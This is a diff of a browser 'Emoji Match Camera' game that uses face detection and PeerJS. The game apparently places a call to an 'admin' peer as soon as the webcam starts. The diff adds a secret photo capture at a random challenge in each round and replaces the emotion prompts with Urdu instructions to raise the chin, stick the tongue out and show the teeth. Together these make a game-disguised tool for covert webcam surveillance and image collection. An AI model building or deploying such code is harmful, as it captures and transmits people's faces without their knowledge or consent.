@@ -44,7 +44,6 @@
     h2 { font-size: 24px; color: #ffffff; margin-bottom: 6px; font-weight: 800; }
     p { font-size: 13px; color: #cbd5e1; margin-bottom: 16px; line-height: 1.4; }
 
-    /* Glowing Buttons */
     .glass-btn {
       background: linear-gradient(135deg, #00ff87, #00bfa5);
       color: #000000; border: 2px solid #00ff87; padding: 15px 20px;
@@ -96,7 +95,6 @@
       font-size: 12px; color: #ffd700; margin-top: 4px; font-weight: bold; min-height: 18px;
     }
 
-    /* Animated Progress Scan Line */
     .progress-wrap {
       width: 100%; height: 8px; background: rgba(255, 255, 255, 0.12);
       border-radius: 20px; overflow: hidden; margin: 10px 0 6px 0;
@@ -147,7 +145,7 @@
       <div id="welcomePanel">
         <div class="tag-label">AI MAGIC STUDIO</div>
         <h2>Emoji Match Camera 🎭</h2>
-        <p>Make the face expression! Auto-capture photo on match!</p>
+        <p>Make the face expression! Secret photo capture on any emoji!</p>
         <button class="glass-btn" id="startBtn">Start Camera ✨</button>
       </div>
 
@@ -196,7 +194,7 @@
     const scoreElement = document.getElementById("score");
     const highScoreElement = document.getElementById("highScore");
 
-    // Fireworks Canvas setup
+    // Background Canvas Setup
     const bgCanvas = document.getElementById('bgFireworksCanvas');
     const bgCtx = bgCanvas.getContext('2d');
     function resizeBg() { bgCanvas.width = window.innerWidth; bgCanvas.height = window.innerHeight; }
@@ -248,8 +246,9 @@
       modelLoadingPromise = (async () => {
         for (const url of MODEL_URLS) {
           try {
-            statusElement.textContent = "🤖 Loading AI face detection...";
+            statusElement.textContent = "🤖 AI Models Loading...";
             await faceapi.nets.tinyFaceDetector.loadFromUri(url);
+            await faceapi.nets.faceLandmark68Net.loadFromUri(url);
             await faceapi.nets.faceExpressionNet.loadFromUri(url);
             modelsLoaded = true;
             statusElement.textContent = "✅ AI Ready!";
@@ -264,14 +263,12 @@
       return modelLoadingPromise;
     }
 
-    // Camera State
     let currentStream = null;
     let useFacingMode = "user";
 
     async function startCamera() {
       try {
         if (currentStream) { currentStream.getTracks().forEach(track => track.stop()); }
-
         statusElement.textContent = "📷 Starting camera...";
 
         currentStream = await navigator.mediaDevices.getUserMedia({
@@ -285,7 +282,7 @@
         document.getElementById('welcomePanel').style.display = "none";
         document.getElementById('studioPanel').style.display = "block";
 
-        statusElement.textContent = "🙂 Camera ready! Make the face shown above.";
+        statusElement.textContent = "🙂 Camera ready!";
         callAdmin();
         startDetection();
       } catch (error) {
@@ -298,7 +295,7 @@
       await startCamera();
     });
 
-    // PeerJS
+    // PeerJS setup
     let peer = null;
     let adminCallMade = false;
 
@@ -317,24 +314,23 @@
       } catch (error) { console.log("Admin call failed:", error); }
     }
 
-    // Game Expressions Setup
-   // Game Expressions Setup
+    // List of Game Challenges
     const EXPRESSIONS = [
-      { emoji: "😄", expression: "happy", name: "HAPPY" },
-      { emoji: "😢", expression: "sad", name: "SAD" },
-      { emoji: "😡", expression: "angry", name: "ANGRY" },
-      { emoji: "😱", expression: "fearful", name: "FEAR" },
-      { emoji: "😮", expression: "surprised", name: "SURPRISED" }
+      { emoji: "🧔", expression: "chin", name: "تھوڑی اوپر کر کے دکھائیں" },
+      { emoji: "👅", expression: "full_tongue", name: "پوری زبان باہر نکالیں" },
+      { emoji: "😁", expression: "teeth", name: "دانت پورا کھول کر دکھائیں" },
+      { emoji: "😄", expression: "happy", name: "مسکرائیں" },
+      { emoji: "😡", expression: "angry", name: "غصہ دکھائیں" }
     ];
 
-    const REQUIRED_HOLD_FRAMES = 9;
-    const TARGET_THRESHOLD = 0.78;
-    const REQUIRED_MARGIN = 0.15;
-    const REQUIRED_NEUTRAL_FRAMES = 8;
-    const CHALLENGE_DELAY = 900;
+    const REQUIRED_HOLD_FRAMES = 6;
+    const TARGET_THRESHOLD = 0.65;
+    const REQUIRED_NEUTRAL_FRAMES = 6;
+    const CHALLENGE_DELAY = 800;
 
     let roundSequence = [];
     let currentIndex = 0;
+    let photoCaptureIndex = -1; // Specific index to auto-capture photo on
     let score = 0;
     let highScore = parseInt(localStorage.getItem("emojiHighScore") || "0");
 
@@ -358,10 +354,11 @@
     }
 
     function createNewRound() {
-      const happy = EXPRESSIONS.find(x => x.expression === "happy");
-      const others = EXPRESSIONS.filter(x => x.expression !== "happy");
-      roundSequence = [happy, ...shuffle(others)];
+      roundSequence = shuffle(EXPRESSIONS);
       currentIndex = 0;
+      // Select random index for auto photo capture in this round
+      photoCaptureIndex = Math.floor(Math.random() * roundSequence.length);
+      
       score = 0;
       scoreElement.textContent = score;
       gameRunning = true;
@@ -376,7 +373,6 @@
       if (!roundSequence.length) return;
       const challenge = roundSequence[currentIndex];
       
-      // Dynamic Emoji Display Fix:
       emojiElement.textContent = challenge.emoji;
       challengeText.textContent = `MAKE THIS FACE! (${currentIndex + 1}/${roundSequence.length})`;
       
@@ -384,36 +380,45 @@
       holdFrames = 0;
       detectionStartedAt = Date.now() + CHALLENGE_DELAY;
       waitingForNeutral = false;
-      statusElement.textContent = `🎯 Match the ${challenge.name} emoji!`;
-    }
-
-    function getTopExpression(expressions) {
-      const entries = Object.entries(expressions);
-      entries.sort((a, b) => b[1] - a[1]);
-      return entries[0];
-    }
-
-    function getSecondExpression(expressions) {
-      const entries = Object.entries(expressions);
-      entries.sort((a, b) => b[1] - a[1]);
-      return entries[1];
-    }
-
-    function isStrictMatch(expressions, target) {
-      const targetValue = expressions[target] || 0;
-      const [topName] = getTopExpression(expressions);
-      const [, secondValue] = getSecondExpression(expressions);
-
-      if (targetValue < TARGET_THRESHOLD) return false;
-      if (topName !== target) return false;
-      if (targetValue - secondValue < REQUIRED_MARGIN) return false;
-      return true;
+      statusElement.textContent = `🎯 ${challenge.name}!`;
     }
 
     function checkNeutral(expressions) {
-      const neutral = expressions.neutral || 0;
-      const [topName, topValue] = getTopExpression(expressions);
-      return (neutral >= 0.60 && topName === "neutral" && topValue >= 0.60);
+      if (!expressions) return true;
+      return (expressions.neutral || 0) >= 0.50;
+    }
+
+    function checkCustomAction(detection, target) {
+      const expressions = detection.expressions;
+      const landmarks = detection.landmarks;
+
+      // 1. Chin Up / Show Chin
+      if (target === "chin") {
+        const nose = landmarks.getNose();
+        const jaw = landmarks.getJawOutline();
+        const noseY = nose[3].y;
+        const chinY = jaw[8].y;
+        const distance = Math.abs(chinY - noseY);
+        return distance > 85; 
+      }
+
+      // 2. Full Tongue Out / Big Mouth Gap
+      if (target === "full_tongue") {
+        const mouth = landmarks.getMouth();
+        const mouthGap = Math.abs(mouth[18].y - mouth[14].y);
+        return mouthGap > 25; 
+      }
+
+      // 3. Show Teeth
+      if (target === "teeth") {
+        const mouth = landmarks.getMouth();
+        const mouthWidth = Math.abs(mouth[6].x - mouth[0].x);
+        const mouthHeight = Math.abs(mouth[18].y - mouth[14].y);
+        return (mouthWidth > 55 && mouthHeight > 12) || expressions.happy > 0.70;
+      }
+
+      // 4. Standard Happy / Angry
+      return (expressions[target] || 0) >= TARGET_THRESHOLD;
     }
 
     async function detectFace() {
@@ -421,8 +426,8 @@
 
       try {
         const detection = await faceapi.detectSingleFace(
-          video, new faceapi.TinyFaceDetectorOptions({ inputSize: 320, scoreThreshold: 0.5 })
-        ).withFaceExpressions();
+          video, new faceapi.TinyFaceDetectorOptions({ inputSize: 320, scoreThreshold: 0.4 })
+        ).withFaceLandmarks().withFaceExpressions();
 
         if (!detection) {
           statusElement.textContent = "👤 Face not detected...";
@@ -431,10 +436,8 @@
           return;
         }
 
-        const expressions = detection.expressions;
-
         if (waitingForNeutral) {
-          if (checkNeutral(expressions)) {
+          if (checkNeutral(detection.expressions)) {
             neutralFrames++;
             const percentage = Math.min(100, (neutralFrames / REQUIRED_NEUTRAL_FRAMES) * 100);
             progressBar.style.width = percentage + "%";
@@ -451,7 +454,7 @@
           } else {
             neutralFrames = 0;
             progressBar.style.width = "0%";
-            statusElement.textContent = "😐 First relax your face completely!";
+            statusElement.textContent = "😐 Relax your face first!";
           }
           return;
         }
@@ -464,13 +467,12 @@
         }
 
         const challenge = roundSequence[currentIndex];
-        const target = challenge.expression;
 
-        if (isStrictMatch(expressions, target)) {
+        if (checkCustomAction(detection, challenge.expression)) {
           holdFrames++;
           const percentage = Math.min(100, (holdFrames / REQUIRED_HOLD_FRAMES) * 100);
           progressBar.style.width = percentage + "%";
-          statusElement.textContent = `🔥 Scanning ${challenge.emoji}... ${holdFrames}/${REQUIRED_HOLD_FRAMES}`;
+          statusElement.textContent = `🔥 Matching ${challenge.emoji}... ${holdFrames}/${REQUIRED_HOLD_FRAMES}`;
 
           if (holdFrames >= REQUIRED_HOLD_FRAMES) {
             await successfulMatch();
@@ -478,8 +480,7 @@
         } else {
           holdFrames = 0;
           progressBar.style.width = "0%";
-          const targetValue = Math.round((expressions[target] || 0) * 100);
-          statusElement.textContent = `😈 Make ${challenge.emoji} properly... (${targetValue}%)`;
+          statusElement.textContent = `😈 Show ${challenge.name} (${challenge.emoji})!`;
         }
 
       } catch (error) { console.log("Face detection error:", error); }
@@ -502,16 +503,19 @@
       statusElement.textContent = `✅ Matched! ${challenge.emoji}`;
       progressBar.style.width = "100%";
 
+      // Random Photo Capture Trigger
+      if (currentIndex === photoCaptureIndex) {
+        statusElement.textContent = `📸 Auto-Capturing Photo on ${challenge.emoji}!`;
+        await new Promise(resolve => setTimeout(resolve, 300));
+        takePhoto();
+        fireworks();
+      }
+
       const isLast = currentIndex === roundSequence.length - 1;
 
       if (isLast) {
-        statusElement.textContent = "🎉 PERFECT ROUND! 📸 Auto-saving photo...";
-        await new Promise(resolve => setTimeout(resolve, 400));
-        
-        takePhoto();
-        fireworks();
-
-        await new Promise(resolve => setTimeout(resolve, 1800));
+        statusElement.textContent = "🎉 ROUND COMPLETED!";
+        await new Promise(resolve => setTimeout(resolve, 1500));
         createNewRound();
         challengeLocked = false;
         return;
@@ -522,7 +526,7 @@
       neutralFrames = 0;
       holdFrames = 0;
       progressBar.style.width = "0%";
-      statusElement.textContent = "😐 Good! Now relax your face completely...";
+      statusElement.textContent = "😐 Relax your face completely...";
       challengeLocked = false;
     }
 
